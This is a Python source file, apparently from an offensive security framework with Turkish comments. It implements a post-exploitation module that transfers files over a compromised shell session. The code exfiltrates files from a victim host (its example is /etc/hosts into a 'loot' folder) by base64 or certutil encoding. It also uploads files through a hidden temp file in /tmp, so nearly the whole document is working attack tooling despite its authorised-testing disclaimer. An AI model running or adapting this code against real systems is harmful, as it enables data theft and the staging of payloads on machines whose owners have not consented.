# =============================================================================
# Post-Exploitation: Penelope Tarzı Uzak Dosya Transfer (Download/Upload)
# =============================================================================
# Aktif shell oturumu üzerinden base64 kodlama ile dosya indirme ve yükleme
# yapan modül.  Penelope'nin download/upload mantığını taklit eder.
#
# KULLANIM:
#   use post/gather/remote_download
#   set SESSION 1
#   set MODE download        (download / upload)
#   set REMOTE_PATH /etc/hosts
#   set LOCAL_PATH ./loot/hosts
#   run
#
# Bu modül tamamen etik siber güvenlik ve yetkili penetrasyon testi
# amaçlıdır. Yalnızca yazılı izin alınmış sistemlerde kullanılmalıdır.
# =============================================================================

from __future__ import annotations

import base64
import hashlib
import os
import time
import uuid
from typing import Any

from rich.console import Console
from rich.panel import Panel
from rich.table import Table

from core import logger
from core.module import BaseModule
from core.option import Option
from core.shared_state import shared_state


class RemoteDownload(BaseModule):
    """
    Penelope Tarzı Uzak Dosya Transfer Modülü.

    Shell oturumu (PTY/raw) üzerinden base64 kodlama ile dosya transferi yapar.
    """

    Name = "Remote File Transfer"
    Description = (
        "Aktif shell oturumu üzerinden base64 ile dosya indirme/yükleme yapar"
    )
    Author = "Mahmut P."
    Category = "post/gather"
    Version = "1.0"

    def __init__(self) -> None:
        super().__init__()
        self.Options = {
            "SESSION": Option("SESSION", "", True, "Hedef oturum ID'si."),
            "MODE": Option(
                "MODE", "download", True,
                "Transfer modu: download (uzaktan indir) veya upload (uzağa yükle).",
                choices=["download", "upload"],
            ),
            "REMOTE_PATH": Option(
                "REMOTE_PATH", "", True, "Uzak dosya yolu.",
            ),
            "LOCAL_PATH": Option(
                "LOCAL_PATH", "", True, "Yerel dosya yolu.",
                completion_dir=".",
            ),
            "TIMEOUT": Option(
                "TIMEOUT", 30, False, "Transfer zaman aşımı (saniye).",
            ),
            "VERIFY": Option(
                "VERIFY", "true", False,
                "Hash ile doğrulama yap (true/false).",
                choices=["true", "false"],
            ),
        }
        self.console = Console()

    # ─── Socket üzerinden komut çalıştırma ──────────────────────────────

    @staticmethod
    def _exec_on_session(sock: Any, command: str, timeout: float = 10.0) -> str:
        """Shell oturumuna komut gönderir ve marker tabanlı çıktı yakalar."""
        marker = f"__MAH_{uuid.uuid4().hex[:12]}__"
        start_marker = f"{marker}START"
        end_marker = f"{marker}END"

        wrapped = f"echo {start_marker} && {command} 2>/dev/null && echo {end_marker}\n"

        try:
            sock.setblocking(False)
            try:
                while True:
                    d = sock.recv(4096)
                    if not d:
                        break
            except (BlockingIOError, OSError):
                pass
            sock.setblocking(True)

            sock.sendall(wrapped.encode("utf-8", errors="replace"))

            sock.settimeout(timeout)
            response = b""
            deadline = time.time() + timeout

            while time.time() < deadline:
                try:
                    chunk = sock.recv(8192)
                    if not chunk:
                        break
                    response += chunk
                    if end_marker.encode() in response:
                        time.sleep(0.1)
                        try:
                            extra = sock.recv(8192)
                            if extra:
                                response += extra
                        except (TimeoutError, BlockingIOError, OSError):
                            pass
                        break
                except TimeoutError:
                    break
                except (BlockingIOError, OSError):
                    break

            sock.settimeout(None)
            decoded = response.decode("utf-8", errors="replace")

            if start_marker in decoded and end_marker in decoded:
                start_idx = decoded.index(start_marker) + len(start_marker)
                end_idx = decoded.index(end_marker)
                output = decoded[start_idx:end_idx].strip()
                lines = [l for l in output.split("\n")
                         if start_marker not in l and end_marker not in l
                         and "echo " + start_marker not in l]
                return "\n".join(lines).strip()
            elif start_marker in decoded:
                start_idx = decoded.index(start_marker) + len(start_marker)
                return decoded[start_idx:].strip()
            return decoded.strip()
        except Exception as e:
            return f"[Hata: {e}]"

    def _detect_os(self, sock: Any, timeout: float) -> str:
        """Uzak hedefin OS'unu algılar."""
        result = self._exec_on_session(sock, "uname -s", timeout=timeout)
        if "linux" in result.lower():
            return "linux"
        if "darwin" in result.lower():
            return "macos"
        win_check = self._exec_on_session(sock, "echo %OS%", timeout=timeout)
        if "windows" in win_check.lower():
            return "windows"
        return "linux"

    # ─── Download ──────────────────────────────────────────────────────────

    def _download_file(
        self, sock: Any, remote_path: str, local_path: str,
        target_os: str, timeout: float, verify: bool,
    ) -> bool:
        """Uzak dosyayı base64 ile indirip yerel dosyaya yazar."""
        self.console.print(f"[cyan][*] İndiriliyor: {remote_path}[/cyan]")

        # Önce dosya var mı kontrol et
        if target_os == "windows":
            check = self._exec_on_session(
                sock, f'if exist "{remote_path}" (echo EXISTS) else (echo NOTFOUND)',
                timeout=timeout,
            )
        else:
            check = self._exec_on_session(
                sock, f'test -f "{remote_path}" && echo EXISTS || echo NOTFOUND',
                timeout=timeout,
            )

        if "NOTFOUND" in check:
            self.console.print(f"[bold red][!] Dosya bulunamadı: {remote_path}[/bold red]")
            return False

        # Dosya boyutunu öğren
        if target_os != "windows":
            size_str = self._exec_on_session(
                sock, f'stat -c%s "{remote_path}" 2>/dev/null || '
                      f'stat -f%z "{remote_path}" 2>/dev/null || echo 0',
                timeout=timeout,
            )
            try:
                file_size = int(size_str.strip().split("\n")[-1])
            except ValueError:
                file_size = 0
            self.console.print(f"[*] Dosya boyutu: {file_size:,} byte")

        # base64 ile oku
        if target_os == "windows":
            b64_cmd = f'certutil -encode "{remote_path}" CON'
        else:
            b64_cmd = f'base64 "{remote_path}"'

        b64_output = self._exec_on_session(sock, b64_cmd, timeout=timeout)

        if not b64_output or "[Hata" in b64_output:
            self.console.print(f"[bold red][!] base64 okuması başarısız.[/bold red]")
            return False

        # Windows certutil çıktısını temizle
        if target_os == "windows":
            lines = b64_output.split("\n")
            cleaned = [l for l in lines
                       if "BEGIN CERTIFICATE" not in l
                       and "END CERTIFICATE" not in l
                       and "CertUtil" not in l]
            b64_output = "".join(l.strip() for l in cleaned)
        else:
            b64_output = "".join(b64_output.split())

        # Decode
        try:
            file_data = base64.b64decode(b64_output)
        except Exception as e:
            self.console.print(f"[bold red][!] Base64 decode hatası: {e}[/bold red]")
            return False

        # Yerel dizini oluştur
        local_dir = os.path.dirname(os.path.abspath(local_path))
        if local_dir:
            os.makedirs(local_dir, exist_ok=True)

        with open(local_path, "wb") as f:
            f.write(file_data)

        self.console.print(
            f"[bold green][+] İndirildi: {local_path} "
            f"({len(file_data):,} byte)[/bold green]"
        )

        # Hash doğrulama
        if verify and target_os != "windows":
            local_hash = hashlib.sha256(file_data).hexdigest()
            remote_hash_output = self._exec_on_session(
                sock,
                f'sha256sum "{remote_path}" 2>/dev/null || '
                f'shasum -a 256 "{remote_path}" 2>/dev/null',
                timeout=timeout,
            )
            if remote_hash_output:
                remote_hash = remote_hash_output.strip().split()[0] if remote_hash_output.strip() else ""
                if local_hash == remote_hash:
                    self.console.print("[bold green][✓] Hash doğrulaması başarılı.[/bold green]")
                else:
                    self.console.print(
                        f"[bold yellow][!] Hash uyuşmazlığı!\n"
                        f"    Yerel : {local_hash}\n"
                        f"    Uzak  : {remote_hash}[/bold yellow]"
                    )

        return True

    # ─── Upload ────────────────────────────────────────────────────────────

    def _upload_file(
        self, sock: Any, local_path: str, remote_path: str,
        target_os: str, timeout: float, verify: bool,
    ) -> bool:
        """Yerel dosyayı base64 ile uzak sisteme yükler."""
        if not os.path.isfile(local_path):
            self.console.print(f"[bold red][!] Yerel dosya bulunamadı: {local_path}[/bold red]")
            return False

        with open(local_path, "rb") as f:
            file_data = f.read()

        file_size = len(file_data)
        self.console.print(f"[cyan][*] Yükleniyor: {local_path} → {remote_path}[/cyan]")
        self.console.print(f"[*] Dosya boyutu: {file_size:,} byte")

        b64_data = base64.b64encode(file_data).decode("ascii")

        # Chunk'lara böl (shell satır sınırı nedeniyle)
        chunk_size = 4096
        chunks = [b64_data[i:i + chunk_size] for i in range(0, len(b64_data), chunk_size)]

        self.console.print(f"[*] {len(chunks)} parça olarak gönderiliyor...")

        # İlk chunk: dosyayı oluştur
        if target_os == "windows":
            # Windows: certutil yöntemi
            tmp_b64 = remote_path + ".b64"
            self._exec_on_session(
                sock, f'echo {chunks[0]} > "{tmp_b64}"', timeout=timeout
            )
            for i, chunk in enumerate(chunks[1:], 2):
                self._exec_on_session(
                    sock, f'echo {chunk} >> "{tmp_b64}"', timeout=timeout
                )
            self._exec_on_session(
                sock, f'certutil -decode "{tmp_b64}" "{remote_path}" && del "{tmp_b64}"',
                timeout=timeout,
            )
        else:
            # Unix: base64 -d
            self._exec_on_session(
                sock, f'echo -n "{chunks[0]}" > /tmp/.mah_upload.b64', timeout=timeout
            )
            for chunk in chunks[1:]:
                self._exec_on_session(
                    sock, f'echo -n "{chunk}" >> /tmp/.mah_upload.b64', timeout=timeout
                )
            self._exec_on_session(
                sock,
                f'base64 -d /tmp/.mah_upload.b64 > "{remote_path}" && '
                f'rm -f /tmp/.mah_upload.b64',
                timeout=timeout,
            )

        self.console.print(
            f"[bold green][+] Yüklendi: {remote_path} ({file_size:,} byte)[/bold green]"
        )

        # Hash doğrulama
        if verify and target_os != "windows":
            local_hash = hashlib.sha256(file_data).hexdigest()
            remote_hash_output = self._exec_on_session(
                sock,
                f'sha256sum "{remote_path}" 2>/dev/null || '
                f'shasum -a 256 "{remote_path}" 2>/dev/null',
                timeout=timeout,
            )
            if remote_hash_output:
                remote_hash = remote_hash_output.strip().split()[0] if remote_hash_output.strip() else ""
                if local_hash == remote_hash:
                    self.console.print("[bold green][✓] Hash doğrulaması başarılı.[/bold green]")
                else:
                    self.console.print(
                        f"[bold yellow][!] Hash uyuşmazlığı![/bold yellow]"
                    )

        return True

    # ─── Ana Çalıştırma ────────────────────────────────────────────────────

    def run(self, options: dict[str, Any]) -> bool:
        """Shell oturumu üzerinden dosya transfer yapar."""
        session_id_raw = options.get("SESSION", "")
        if not session_id_raw or str(session_id_raw).strip() == "":
            self.console.print("[bold red][!] SESSION belirtilmedi.[/bold red]")
            return False

        try:
            session_id = int(str(session_id_raw).strip())
        except ValueError:
            self.console.print(f"[bold red][!] Geçersiz SESSION: {session_id_raw}[/bold red]")
            return False

        mode = str(options.get("MODE", "download")).lower().strip()
        remote_path = str(options.get("REMOTE_PATH", "")).strip()
        local_path = str(options.get("LOCAL_PATH", "")).strip()
        timeout = float(options.get("TIMEOUT", 30))
        verify = str(options.get("VERIFY", "true")).lower() == "true"

        if not remote_path:
            self.console.print("[bold red][!] REMOTE_PATH belirtilmedi.[/bold red]")
            return False
        if not local_path:
            self.console.print("[bold red][!] LOCAL_PATH belirtilmedi.[/bold red]")
            return False

        # Oturumu bul
        if not shared_state.session_manager:
            self.console.print("[bold red][!] Session manager başlatılmamış.[/bold red]")
            return False

        session = shared_state.session_manager.get_session(session_id)
        if not session:
            self.console.print(f"[bold red][!] Session {session_id} bulunamadı.[/bold red]")
            return False

        handler = session.get("handler")
        if not handler:
            self.console.print(f"[bold red][!] Session {session_id}: handler yok.[/bold red]")
            return False

        sock = None
        if hasattr(handler, "resolve_client_sock"):
            sock = handler.resolve_client_sock(session_id)
        if not sock:
            sock = getattr(handler, "client_sock", None)
        if not sock:
            self.console.print(f"[bold red][!] Session {session_id}: aktif soket yok.[/bold red]")
            return False

        # OS algıla
        target_os = self._detect_os(sock, min(timeout, 10))

        self.console.print()
        mode_icon = "⬇️" if mode == "download" else "⬆️"
        self.console.print(Panel.fit(
            f"[bold cyan]{mode_icon} DOSYA TRANSFERİ — Session {session_id}[/bold cyan]\n"
            f"[dim]Mod: {mode} | OS: {target_os}[/dim]",
            border_style="cyan",
        ))

        if mode == "download":
            success = self._download_file(
                sock, remote_path, local_path, target_os, timeout, verify
            )
        elif mode == "upload":
            success = self._upload_file(
                sock, local_path, remote_path, target_os, timeout, verify
            )
        else:
            self.console.print(f"[bold red][!] Geçersiz mod: {mode}[/bold red]")
            return False

        if shared_state.session_manager:
            shared_state.session_manager.update_session_activity(session_id)

        return success
